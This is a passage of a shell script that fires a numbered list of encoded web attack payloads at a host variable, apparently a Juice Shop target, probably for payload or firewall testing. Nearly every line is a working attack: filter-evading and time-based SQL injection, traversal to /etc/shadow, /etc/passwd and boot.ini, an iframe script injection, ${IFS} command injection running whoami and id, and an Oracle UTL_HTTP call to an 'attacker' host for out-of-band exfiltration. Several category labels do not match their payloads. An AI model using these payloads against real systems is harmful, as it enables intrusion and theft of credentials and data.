  "$HOST$URI?q=%2Fvar%2Fwww%2Fhtml%2F..%2F..%2F..%2Fetc%2Fshadow"
do_curl 'juiceshop-0286' 'xss' '..\\\\..\\\\..\\\\boot.ini' \
  "$HOST$URI?q=..%5C%5C%5C%5C..%5C%5C%5C%5C..%5C%5C%5C%5Cboot.ini"
do_curl 'juiceshop-0287' 'sqli' ''\''/**/OR/**/1/**/=/**/1--' \
  "$HOST$URI?q=%27%2F%2A%2A%2FOR%2F%2A%2A%2F1%2F%2A%2A%2F%3D%2F%2A%2A%2F1--"
do_curl 'juiceshop-0288' 'sqli' ''\''%09OR%091=1' \
  "$HOST$URI?q=%27%2509OR%25091%3D1"
do_curl 'juiceshop-0289' 'sqli' ''\''%20oR%201=1--' \
  "$HOST$URI?q=%27%2520oR%25201%3D1--"
do_curl 'juiceshop-0290' 'sqli' ''\''+UNION+SELECT+NULL,NULL--' \
  "$HOST$URI?q=%27%2BUNION%2BSELECT%2BNULL%2CNULL--"
do_curl 'juiceshop-0291' 'sqli' ''\''/*!12345OR*/1=1--' \
  "$HOST$URI?q=%27%2F%2A%2112345OR%2A%2F1%3D1--"
do_curl 'juiceshop-0292' 'sqli' ''\''+/*!00000SELECT*/+NULL,NULL--' \
  "$HOST$URI?q=%27%2B%2F%2A%2100000SELECT%2A%2F%2BNULL%2CNULL--"
do_curl 'juiceshop-0293' 'sqli' ''\'' AND 1=1#' \
  "$HOST$URI?q=%27%20AND%201%3D1%23"
do_curl 'juiceshop-0294' 'sqli' ''\'' OR TRUE--' \
  "$HOST$URI?q=%27%20OR%20TRUE--"
do_curl 'juiceshop-0295' 'sqli' ''\'' AND SLEEP(3)--' \
  "$HOST$URI?q=%27%20AND%20SLEEP%283%29--"
do_curl 'juiceshop-0296' 'sqli' ''\''%2f**%2fOR%2f**%2f1=1--' \
  "$HOST$URI?q=%27%252f%2A%2A%252fOR%252f%2A%2A%252f1%3D1--"
do_curl 'juiceshop-0297' 'sqli' '1'\'' or '\''1'\''='\''1'\'' --' \
  "$HOST$URI?q=1%27%20or%20%271%27%3D%271%27%20--"
do_curl 'juiceshop-0298' 'sqli' '1 or 1=1' \
  "$HOST$URI?q=1%20or%201%3D1"
do_curl 'juiceshop-0299' 'sqli' '0'\'' OR 1=1--' \
  "$HOST$URI?q=0%27%20OR%201%3D1--"
do_curl 'juiceshop-0300' 'sqli' ''\'' OR 1=1 LIMIT 1--' \
  "$HOST$URI?q=%27%20OR%201%3D1%20LIMIT%201--"
do_curl 'juiceshop-0301' 'sqli' ''\''||UTL_HTTP.REQUEST('\''http://attacker'\'')' \
  "$HOST$URI?q=%27%7C%7CUTL_HTTP.REQUEST%28%27http%3A%2F%2Fattacker%27%29"
do_curl 'juiceshop-0302' 'sqli' ''\''||CHR(97)||CHR(98)||CHR(99)=abc' \
  "$HOST$URI?q=%27%7C%7CCHR%2897%29%7C%7CCHR%2898%29%7C%7CCHR%2899%29%3Dabc"
do_curl 'juiceshop-0303' 'sqli' ''\'' UNION/**/SELECT/**/NULL,NULL--' \
  "$HOST$URI?q=%27%20UNION%2F%2A%2A%2FSELECT%2F%2A%2A%2FNULL%2CNULL--"
do_curl 'juiceshop-0304' 'sqli' ''\'' or if(1=1,sleep(2),0)--' \
  "$HOST$URI?q=%27%20or%20if%281%3D1%2Csleep%282%29%2C0%29--"
do_curl 'juiceshop-0305' 'sqli' '0x27206f7220313d31--' \
  "$HOST$URI?q=0x27206f7220313d31--"
do_curl 'juiceshop-0306' 'sqli' '%u0027%20OR%201=1--' \
  "$HOST$URI?q=%25u0027%2520OR%25201%3D1--"
do_curl 'juiceshop-0307' 'sqli' '%2527%2520OR%25201=1--' \
  "$HOST$URI?q=%252527%252520OR%2525201%3D1--"
do_curl 'juiceshop-0308' 'sqli' '%27UNION%0ASELECT%0ANULL,NULL--' \
  "$HOST$URI?q=%2527UNION%250ASELECT%250ANULL%2CNULL--"
do_curl 'juiceshop-0309' 'sqli' '1'\'' AND (SELECT 1 FROM dual WHERE 1=1)--' \
  "$HOST$URI?q=1%27%20AND%20%28SELECT%201%20FROM%20dual%20WHERE%201%3D1%29--"
do_curl 'juiceshop-0310' 'sqli' '1'\'' AND (SELECT sleep(3))--' \
  "$HOST$URI?q=1%27%20AND%20%28SELECT%20sleep%283%29%29--"
do_curl 'juiceshop-0311' 'sqli' ''\'' OR EXISTS(SELECT * FROM users)--' \
  "$HOST$URI?q=%27%20OR%20EXISTS%28SELECT%20%2A%20FROM%20users%29--"
do_curl 'juiceshop-0312' 'sqli' ''\'' AND (SELECT 1 WHERE SUBSTRING(@@version,1,1)='\''5'\'')--' \
  "$HOST$URI?q=%27%20AND%20%28SELECT%201%20WHERE%20SUBSTRING%28%40%40version%2C1%2C1%29%3D%275%27%29--"
do_curl 'juiceshop-0313' 'sqli' '1/**/OR/**/'\''1'\''/**/=/**/'\''1' \
  "$HOST$URI?q=1%2F%2A%2A%2FOR%2F%2A%2A%2F%271%27%2F%2A%2A%2F%3D%2F%2A%2A%2F%271"
do_curl 'juiceshop-0314' 'sqli' '1+oR+1=1' \
  "$HOST$URI?q=1%2BoR%2B1%3D1"
do_curl 'juiceshop-0315' 'sqli' '1%0bOR%0b1=1' \
  "$HOST$URI?q=1%250bOR%250b1%3D1"
do_curl 'juiceshop-0316' 'xss' '1/**/oR/**/1/**/=/**/1' \
  "$HOST$URI?q=1%2F%2A%2A%2FoR%2F%2A%2A%2F1%2F%2A%2A%2F%3D%2F%2A%2A%2F1"
do_curl 'juiceshop-0317' 'sqli' '0'\''/**/UNION/**/SELECT/**/NULL,NULL--' \
  "$HOST$URI?q=0%27%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2FNULL%2CNULL--"
do_curl 'juiceshop-0318' 'sqli' ''\''||mid(version(),1,1)=5' \
  "$HOST$URI?q=%27%7C%7Cmid%28version%28%29%2C1%2C1%29%3D5"
do_curl 'juiceshop-0319' 'sqli' ''\''--%00' \
  "$HOST$URI?q=%27--%2500"
do_curl 'juiceshop-0320' 'xss' '/etc/passwd' \
  "$HOST$URI?q=%2Fetc%2Fpasswd"
do_curl 'juiceshop-0321' 'sqli' ''\''/**/UNION/**/SELECT/**/NULL,NULL--' \
  "$HOST$URI?q=%27%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2FNULL%2CNULL--"
do_curl 'juiceshop-0322' 'sqli' '1'\''/**/OR/**/'\''1'\''/**/=/**/'\''1' \
  "$HOST$URI?q=1%27%2F%2A%2A%2FOR%2F%2A%2A%2F%271%27%2F%2A%2A%2F%3D%2F%2A%2A%2F%271"
do_curl 'juiceshop-0323' 'xss' '<IFRAME SRC="jav&#x09;ascript:alert(1)">' \
  "$HOST$URI?q=%3CIFRAME%20SRC%3D%22jav%26%23x09%3Bascript%3Aalert%281%29%22%3E"
do_curl 'juiceshop-0324' 'lfi' '....%5C....%5C....%5Cetc%5Cpasswd' \
  "$HOST$URI?q=....%255C....%255C....%255Cetc%255Cpasswd"
do_curl 'juiceshop-0325' 'sqli' '1'\'' AND 1=1--' \
  "$HOST$URI?q=1%27%20AND%201%3D1--"
do_curl 'juiceshop-0326' 'xss' '1'\''||'\''1' \
  "$HOST$URI?q=1%27%7C%7C%271"
do_curl 'juiceshop-0327' 'sqli' '1'\''--' \
  "$HOST$URI?q=1%27--"
do_curl 'juiceshop-0328' 'sqli' '1'\'';--' \
  "$HOST$URI?q=1%27%3B--"
do_curl 'juiceshop-0329' 'sqli' '1%27--' \
  "$HOST$URI?q=1%2527--"
do_curl 'juiceshop-0330' 'sqli' '1'\''/**/OR/**/1/**/=/**/1--' \
  "$HOST$URI?q=1%27%2F%2A%2A%2FOR%2F%2A%2A%2F1%2F%2A%2A%2F%3D%2F%2A%2A%2F1--"
do_curl 'juiceshop-0331' 'sqli' '1'\''/*+*/OR/*+*/1=1--' \
  "$HOST$URI?q=1%27%2F%2A%2B%2A%2FOR%2F%2A%2B%2A%2F1%3D1--"
do_curl 'juiceshop-0332' 'sqli' ''\'' oR '\''1'\''='\''1' \
  "$HOST$URI?q=%27%20oR%20%271%27%3D%271"
do_curl 'juiceshop-0333' 'sqli' ''\'' oR 1=1--' \
  "$HOST$URI?q=%27%20oR%201%3D1--"
do_curl 'juiceshop-0334' 'sqli' '%31%27%20--' \
  "$HOST$URI?q=%2531%2527%2520--"
do_curl 'juiceshop-0335' 'sqli' '1'\'' --' \
  "$HOST$URI?q=1%27%20--"
do_curl 'juiceshop-0336' 'sqli' '%27%2F**%2FOR%2F**%2F1%3D1--' \
  "$HOST$URI?q=%2527%252F%2A%2A%252FOR%252F%2A%2A%252F1%253D1--"
do_curl 'juiceshop-0337' 'sqli' '1 AND 1=1' \
  "$HOST$URI?q=1%20AND%201%3D1"
do_curl 'juiceshop-0338' 'sqli' '1 OR 1=1' \
  "$HOST$URI?q=1%20OR%201%3D1"
do_curl 'juiceshop-0339' 'xss' ''\''||' \
  "$HOST$URI?q=%27%7C%7C"
do_curl 'juiceshop-0340' 'xss' ''\''||1' \
  "$HOST$URI?q=%27%7C%7C1"
do_curl 'juiceshop-0341' 'sqli' '1-- -' \
  "$HOST$URI?q=1--%20-"
do_curl 'juiceshop-0342' 'cmdi' 'sh$\{IFS\}-c$\{IFS\}whoami' \
  "$HOST$URI?q=sh%24%5C%7BIFS%5C%7D-c%24%5C%7BIFS%5C%7Dwhoami"
do_curl 'juiceshop-0343' 'cmdi' 'bash$\{IFS\}-c$\{IFS\}'\''id'\''' \
  "$HOST$URI?q=bash%24%5C%7BIFS%5C%7D-c%24%5C%7BIFS%5C%7D%27id%27"
do_curl 'juiceshop-0344' 'cmdi' '$\{IFS\}'\''id'\''}' \
  "$HOST$URI?q=%24%5C%7BIFS%5C%7D%27id%27%7D"
